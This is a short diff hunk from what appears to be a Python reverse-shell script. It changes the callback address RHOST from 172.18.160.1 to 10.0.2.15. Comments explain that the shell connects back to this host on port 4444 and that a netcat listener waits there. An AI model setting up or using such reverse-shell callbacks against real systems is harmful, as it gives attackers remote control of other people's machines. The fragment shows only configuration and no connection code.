@@ -6,7 +6,7 @@ import threading
 # --- CONFIGURATION ---
 # Replace this with YOUR public-facing IP address or domain name.
 # This is where the shell will connect back to.
-RHOST = "172.18.160.1"
+RHOST = "10.0.2.15"
 # Replace this with the port you will be listening on with netcat or another listener.
 RPORT = 4444
 # ---------------------
